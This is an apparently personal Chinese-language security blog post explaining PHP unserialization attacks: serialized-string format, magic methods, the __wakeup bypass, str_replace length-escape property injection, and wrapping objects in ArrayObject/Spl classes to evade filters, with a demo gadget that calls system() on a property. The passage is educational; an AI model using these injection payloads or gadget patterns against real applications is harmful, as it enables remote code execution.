@@ -1,0 +1,634 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Php Unserialize | n2ryx&#39;s Blog</title>
+  <meta name="author" content="n2ryx">
+  
+  <meta name="description" content="Php Unserialize序列化12345678910111213141516171819class S&amp;#123;public $test=&amp;quot;pikachu&amp;quot;;&amp;#125;$s=new S();  # 创建一个对象echo serialize($s);  # 把这个对象进行序列化序列化后得到的结果是这个样子的:O:1:&amp;quot;S&amp;quot;:1:&amp;#123;s:4:&amp;quot;test&amp;quot;;s:7:&amp;quot;pikachu&amp;quot;;&amp;#125;O:代表object1:代表对象名字长度为一个字符S:对象的名称1:代表对象里面有一个变量s:数据类型4:变量名称的长度test:变量名称s:数据类型7:变量值的长度pikachu:变量值
+
+
+private 和 protected 详解
+PHP序列化的时候 private 和 protected 变量会引入不可见字符%00，%00类名%00属性名 为private，%00*%00属性名 为protected，注意这两个 %00就是 ascii 码为0 的字符。
+这个字符显示和输出可能看不到，甚至导致截断，但是url编码后就可以看得清楚.我们可以将序列化的字符用urlencode编码之后,打印出来查看。
+
+魔术方法
+
+
+
+方法
+触发条件
+参数
+返回值
+
+
+
+
+__construct
+实例化对象
+
+
+
+
+
+__destruct
+反序列化之后 销毁之后
+
+
+
+
+
+__sleep
+序列化之前
+
+需要被序列化的成员属性
+
+
+
+__wakeup
+反序列化之前
+
+
+
+
+
+__toString
+把对象当成字符串使用
+
+
+
+
+
+__invoke
+把对象当成函数调用
+
+
+
+
+
+__clone
+当使用clone关键字拷贝完一个对象
+
+
+
+
+
+__call
+调用不存在的方法或者私有的属性
+$arg1,$arg2
+不存在的方法名称&amp;amp;参数
+
+
+
+__callStatic
+静态调用不存在的方法
+$arg1,$arg2
+不存在的方法名称&amp;amp;参数
+
+
+
+__get
+调用成员属性不存在
+$arg1
+不存在的成员属性名称
+
+
+
+__set
+给不存在的成员属性赋值
+$arg1,$arg2
+不存在的成员名称&amp;amp;值
+
+
+
+__isset
+对不可访问属性使用isset()或empty
+$arg1
+不存在的成员属性名称
+
+
+
+__unset
+对不可访问属性使用unset()
+$arg1
+不存在的成员属性名称
+
+
+
+
+__wakeup()函数漏洞绕过原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就不会执行
+
+反序列化逃逸str_replace — 子字符串替换
+
+str_replace(array|string $search,array|string $replace,string|array $subject,int &amp;amp;$count &amp;#x3D; null): string|array
+
+search
+查找的目标值，也就是 needle，一个数组可以指定多个目标。       
+
+replace
+search 的替换值，一个数组可以被用来指定多重替换       
+
+subject
+执行替换的数组或者字符串。也就是 haystack
+如果 subject 是一个数组，替换操作将遍历整个 subject，返回值也将是一个数组。       
+
+count
+如果被指定，它的值将被设置为替换发生的次数
+
+
+返回值
+该函数返回替换后的数组或者字符串。"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Php Unserialize"/>
+  <meta property="og:site_name" content="n2ryx&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="n2ryx&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">n2ryx&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tool" title="All the tools.">
+			  <i class="fa fa-terminal"></i>Tool
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Php Unserialize</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Php-Unserialize"><a href="#Php-Unserialize" class="headerlink" title="Php Unserialize"></a>Php Unserialize</h1><h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$test</span>=<span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$s</span>=<span class="keyword">new</span> <span class="title function_ invoke__">S</span>();  <span class="comment"># 创建一个对象</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s</span>);  <span class="comment"># 把这个对象进行序列化</span></span><br><span class="line"></span><br><span class="line">序列化后得到的结果是这个样子的:</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;S&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">7</span>:<span class="string">&quot;pikachu&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line">O:代表<span class="keyword">object</span></span><br><span class="line"><span class="number">1</span>:代表对象名字长度为一个字符</span><br><span class="line">S:对象的名称</span><br><span class="line"><span class="number">1</span>:代表对象里面有一个变量</span><br><span class="line">s:数据类型</span><br><span class="line"><span class="number">4</span>:变量名称的长度</span><br><span class="line">test:变量名称</span><br><span class="line">s:数据类型</span><br><span class="line"><span class="number">7</span>:变量值的长度</span><br><span class="line">pikachu:变量值</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>private</code> 和 <code>protected</code> 详解</p>
+<p>PHP序列化的时候 private 和 protected 变量会引入不可见字符%00，<br><code>%00类名%00属性名</code> 为private，<code>%00*%00属性名</code> 为protected，注意这两个 %00就是 ascii 码为0 的字符。</p>
+<p>这个字符显示和输出可能看不到，甚至导致截断，但是url编码后就可以看得清楚.我们可以将序列化的字符用urlencode编码之后,打印出来查看。</p>
+</blockquote>
+<p><strong>魔术方法</strong></p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>触发条件</th>
+<th>参数</th>
+<th>返回值</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>__construct</td>
+<td>实例化对象</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>__destruct</td>
+<td>反序列化之后 销毁之后</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>__sleep</td>
+<td>序列化之前</td>
+<td></td>
+<td>需要被序列化的成员属性</td>
+<td></td>
+</tr>
+<tr>
+<td>__wakeup</td>
+<td>反序列化之前</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>__toString</td>
+<td>把对象当成字符串使用</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>__invoke</td>
+<td>把对象当成函数调用</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>__clone</td>
+<td>当使用clone关键字拷贝完一个对象</td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>__call</td>
+<td>调用不存在的方法或者私有的属性</td>
+<td>$arg1,$arg2</td>
+<td>不存在的方法名称&amp;参数</td>
+<td></td>
+</tr>
+<tr>
+<td>__callStatic</td>
+<td>静态调用不存在的方法</td>
+<td>$arg1,$arg2</td>
+<td>不存在的方法名称&amp;参数</td>
+<td></td>
+</tr>
+<tr>
+<td>__get</td>
+<td>调用成员属性不存在</td>
+<td>$arg1</td>
+<td>不存在的成员属性名称</td>
+<td></td>
+</tr>
+<tr>
+<td>__set</td>
+<td>给不存在的成员属性赋值</td>
+<td>$arg1,$arg2</td>
+<td>不存在的成员名称&amp;值</td>
+<td></td>
+</tr>
+<tr>
+<td>__isset</td>
+<td>对不可访问属性使用isset()或empty</td>
+<td>$arg1</td>
+<td>不存在的成员属性名称</td>
+<td></td>
+</tr>
+<tr>
+<td>__unset</td>
+<td>对不可访问属性使用unset()</td>
+<td>$arg1</td>
+<td>不存在的成员属性名称</td>
+<td></td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><code>__wakeup()</code>函数漏洞绕过原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就不会执行</p>
+</blockquote>
+<h2 id="反序列化逃逸"><a href="#反序列化逃逸" class="headerlink" title="反序列化逃逸"></a>反序列化逃逸</h2><p><strong>str_replace</strong> — 子字符串替换</p>
+<blockquote>
+<p><strong>str_replace</strong>(<br>array|string <code>$search</code>,<br>array|string <code>$replace</code>,<br>string|array <code>$subject</code>,<br>int <code>&amp;$count</code> &#x3D; <strong><code>null</code></strong><br>): string|array</p>
+<ul>
+<li><p><code>search</code></p>
+<p>查找的目标值，也就是 <em>needle</em>，一个数组可以指定多个目标。       </p>
+</li>
+<li><p><code>replace</code></p>
+<p><code>search</code> 的替换值，一个数组可以被用来指定多重替换       </p>
+</li>
+<li><p><code>subject</code></p>
+<p>执行替换的数组或者字符串。也就是 <em>haystack</em></p>
+<p>如果 <code>subject</code> 是一个数组，替换操作将遍历整个 <code>subject</code>，返回值也将是一个数组。       </p>
+</li>
+<li><p><code>count</code></p>
+<p>如果被指定，它的值将被设置为替换发生的次数</p>
+</li>
+</ul>
+<p><strong>返回值</strong></p>
+<p>该函数返回替换后的数组或者字符串。 </p>
+</blockquote>
+<h3 id="增多逃逸"><a href="#增多逃逸" class="headerlink" title="增多逃逸"></a>增多逃逸</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;shell2&quot;;&#125;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;ccc&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$A</span>=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$res</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>-&gt;pass;</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">81</span>:<span class="string">&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;shell2&quot;</span>;&#125;<span class="string">&quot;;s:4:&quot;</span>pass<span class="string">&quot;;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s:163:&quot;</span>O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">81</span>:<span class="string">&quot;ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;shell2&quot;</span>;&#125;<span class="string">&quot;;s:4:&quot;</span>pass<span class="string">&quot;;s:6:&quot;</span><span class="number">123456</span><span class="string">&quot;;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">shell2</span><br></pre></td></tr></table></figure>
+
+<p><code>str_replace</code>函数将 $str中的 ‘bb’ 替换成 ‘ccc’，比原来多了一个字符</p>
+<p>O:1:”C”:2:{s:4:”name”;s:4:”<code>在name的属性里写我们想要输入的</code><em>“;s:4:”pass”;s:6:”123456”;}</em><code>后面的pass需要注释掉</code></p>
+<blockquote>
+<p>写在 $name 里的字符串长度 &#x3D;&#x3D; 替换后的字符串长度</p>
+</blockquote>
+<p><strong>str_replace前</strong></p>
+<p>O:1:”C”:2:{s:4:”name”;s:81:”<code>bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:6:&quot;shell2&quot;;&#125;</code>“;s:4:”pass”;s:6:”123456”;}</p>
+<ul>
+<li>有色字体是 $name值 一共<code>81字符</code></li>
+<li>要用<code>&quot;</code>闭合替换后的字符串</li>
+<li><code>s:81</code>表示长度为81，字符串中间有<code>&quot;</code>也会被当成字符串中的一个字符</li>
+<li>最后也要闭合整个序列化值 注释原本的 $pass</li>
+</ul>
+<p><strong>str_replace后</strong></p>
+<p>s:163:”O:1:”C”:2:{s:4:”name”;s:81:”<code>ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc</code>“;s:4:”pass”;s:6:”shell2”;}”;s:4:”pass”;s:6:”123456”;}”;</p>
+<ul>
+<li><code>s:163</code>是作为字符串 $res的长度</li>
+<li>有色字体是经过 str_replace 替换的数据 一共<code>81字符</code></li>
+<li>后面的<code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;shell2&quot;;&#125;</code>便会逃逸，和前面凑成了一个完整的序列化值</li>
+<li><code>&#125;</code>后的<code>&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;&quot;;</code>就被注释了</li>
+</ul>
+<p>通过<code>unserialize </code>$pass 的值就被修改为 “shell2”</p>
+<h3 id="减少逃逸"><a href="#减少逃逸" class="headerlink" title="减少逃逸"></a>减少逃逸</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;cccccccccccccccccccccccccccccccccccccccccccccccccccccc&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>=<span class="string">&#x27;;s:4:&quot;qwer&quot;;s:5:&quot;shell&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;ccc&#x27;</span>, <span class="string">&#x27;bb&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$A</span>=<span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$res</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$res</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>-&gt;qwer;</span><br><span class="line"></span><br><span class="line">输出</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">54</span>:<span class="string">&quot;cccccccccccccccccccccccccccccccccccccccccccccccccccccc&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">22</span>:<span class="string">&quot;;s:4:&quot;</span>qwer<span class="string">&quot;;s:5:&quot;</span>shell<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">s:108:&quot;</span>O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">54</span>:<span class="string">&quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;pass&quot;</span>;s:<span class="number">22</span>:<span class="string">&quot;;s:4:&quot;</span>qwer<span class="string">&quot;;s:5:&quot;</span>shell<span class="string">&quot;;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<p><code>str_replace</code>函数将 $str中的 ‘ccc’ 替换成 ‘bb’，比原来少了一个字符</p>
+<blockquote>
+<p>写在 $name 里的字符串的长度 &#x3D;&#x3D; 替换后的$name字符串 + $pass中不需要字符串 的长度</p>
+</blockquote>
+<p><strong>str_replace前</strong></p>
+<p>O:1:”C”:2:{s:4:”name”;s:54:”cccccccccccccccccccccccccccccccccccccccccccccccccccccc<code>&quot;;s:4:&quot;pass&quot;;s:22:&quot;;s:4:&quot;qwer&quot;;s:5:&quot;shell</code>“;}</p>
+<ul>
+<li>有色字体是 $pass值</li>
+<li>$pass值中<code>&quot;;s:4:&quot;pass&quot;;s:22:</code>“;s:4:”qwer”;s:5:”shell，此行有色字体是需要通过str_replace包含进 $name，后面的<code>&quot;;</code>进行闭合</li>
+<li>$pass值最后加上<code>&quot;;&#125;</code>也可以 -&gt; $pass&#x3D;’;s:4:”qwer”;s:5:”shell”;}，视实际情况而定</li>
+</ul>
+<p><strong>str_replace后</strong></p>
+<p>s:108:”O:1:”C”:2:{s:4:”name”;s:54:”<code>bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb&quot;;s:4:&quot;pass&quot;;s:22:</code>“;s:4:”qwer”;s:5:”shell”;}”;</p>
+<ul>
+<li>s:108  是作为字符串 $res的长度</li>
+<li>有色字体是包含 str_replace后 $name的值</li>
+<li>后面的 <code>s:4:&quot;qwer&quot;;s:5:&quot;shell&quot;;</code>就形成了新的成员和属性</li>
+</ul>
+<p>通过<code>unserialize </code>就会新增成员 $qwer 值为 “shell”</p>
+<h2 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h2><p>过滤 Object、Array…</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">c</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// a:1:&#123;i:0;O:1:&quot;c&quot;:1:&#123;s:4:&quot;code&quot;;s:6:&quot;whoami&quot;;&#125;&#125;</span></span><br><span class="line"><span class="variable">$array</span> = [<span class="keyword">new</span> <span class="title function_ invoke__">c</span>()];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// C:11:&quot;ArrayObject&quot;:61:&#123;x:i:0;a:1:&#123;i:0;O:1:&quot;c&quot;:1:&#123;s:4:&quot;code&quot;;s:6:&quot;whoami&quot;;&#125;&#125;;m:a:0:&#123;&#125;&#125;</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="built_in">ArrayObject</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="keyword">new</span> <span class="title function_ invoke__">c</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// C:16:&quot;SplObjectStorage&quot;:54:&#123;x:i:1;O:1:&quot;c&quot;:1:&#123;s:4:&quot;code&quot;;s:6:&quot;whoami&quot;;&#125;,N;;m:a:0:&#123;&#125;&#125;</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="built_in">SplObjectStorage</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">attach</span>(<span class="keyword">new</span> <span class="title function_ invoke__">c</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// C:8:&quot;SplStack&quot;:41:&#123;i:6;:O:1:&quot;c&quot;:1:&#123;s:4:&quot;code&quot;;s:6:&quot;whoami&quot;;&#125;&#125;</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="built_in">SplStack</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">push</span>(<span class="keyword">new</span> <span class="title function_ invoke__">c</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// C:8:&quot;SplQueue&quot;:41:&#123;i:4;:O:1:&quot;c&quot;:1:&#123;s:4:&quot;code&quot;;s:6:&quot;whoami&quot;;&#125;&#125;</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="built_in">SplQueue</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">enqueue</span>(<span class="keyword">new</span> <span class="title function_ invoke__">c</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// C:19:&quot;SplDoublyLinkedList&quot;:41:&#123;i:0;:O:1:&quot;c&quot;:1:&#123;s:4:&quot;code&quot;;s:6:&quot;whoami&quot;;&#125;&#125;</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="built_in">SplDoublyLinkedList</span>();</span><br><span class="line"><span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">push</span>(<span class="keyword">new</span> <span class="title function_ invoke__">c</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br></pre></td></tr></table></figure>
+
+<h2 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="原生类"><a href="#原生类" class="headerlink" title="原生类"></a>原生类</h2><h3 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h3><p>ReflectionClass</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;类&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;system(&quot;whoami&quot;)&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>Exception\Error</p>
